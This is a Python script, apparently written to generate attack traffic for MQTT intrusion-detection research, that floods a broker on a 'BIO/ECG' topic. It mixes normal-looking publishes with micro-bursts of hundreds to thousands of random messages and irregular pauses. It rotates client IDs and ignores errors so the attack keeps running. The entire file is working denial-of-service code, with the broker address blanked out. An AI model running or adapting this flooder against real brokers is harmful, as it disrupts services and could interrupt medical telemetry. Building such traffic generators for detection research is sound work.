# =====================================================
# MQTT HYBRID ATTACK SIMULATOR
# This script generates a hybrid MQTT attack combining
# normal traffic, micro-burst flooding, and irregular pauses.
# =====================================================

import time
import random
import string
import paho.mqtt.client as mqtt

# =====================================================
# MQTT BROKER CONFIGURATION
# =====================================================

# Target MQTT broker address
BROKER = "__.__.__.__"

# MQTT broker port
PORT = 1883

# MQTT topic used for message publishing
TOPIC = "BIO/ECG"

# Authentication credentials
USER = "prueba"
PASSWORD = "prueba"

# =====================================================
# ATTACK PARAMETERS
# =====================================================

# Total attack duration (seconds)
DURATION = 60

# =====================================================
# PAYLOAD GENERATION FUNCTION
# =====================================================

def rand_payload():
    """
    Generate a random payload with variable size
    to simulate heterogeneous telemetry messages.
    """
    return "".join(
        random.choices(
            string.ascii_letters,
            k=random.randint(200, 1500)
        )
    )

# Attack end time
end = time.time() + DURATION

# Client counter
i = 0

print("Starting HYBRID MQTT attack simulation")

# =====================================================
# MAIN ATTACK LOOP
# =====================================================

while time.time() < end:

    try:

        # Create a new MQTT client for each cycle
        client = mqtt.Client(client_id=f"atk-hybrid-{i}")

        # Set authentication credentials
        client.username_pw_set(USER, PASSWORD)

        # Use a low keepalive interval to increase control traffic
        client.connect(BROKER, PORT, keepalive=random.randint(3, 8))

        client.loop_start()

        # =====================================================
        # PHASE 1 — NORMAL TRAFFIC
        # Simulates legitimate device behavior
        # =====================================================

        for _ in range(random.randint(5, 15)):

            client.publish(TOPIC, rand_payload(), qos=0)

            time.sleep(random.uniform(0.05, 0.2))

        # =====================================================
        # PHASE 2 — MICRO FLOODING BURST
        # High-rate burst of MQTT messages
        # =====================================================

        burst = random.randint(500, 1500)

        for _ in range(burst):

            client.publish(TOPIC, rand_payload(), qos=0)

            # Extremely low inter-arrival time
            time.sleep(random.uniform(0.0001, 0.001))

        # =====================================================
        # PHASE 3 — IRREGULAR PAUSE
        # Simulates intermittent attack behavior
        # =====================================================

        time.sleep(random.uniform(0.2, 1.2))

        # Close MQTT session
        client.loop_stop()
        client.disconnect()

        i += 1

    except Exception:
        # Ignore network errors and continue attack cycle
        pass

print("HYBRID MQTT attack simulation completed")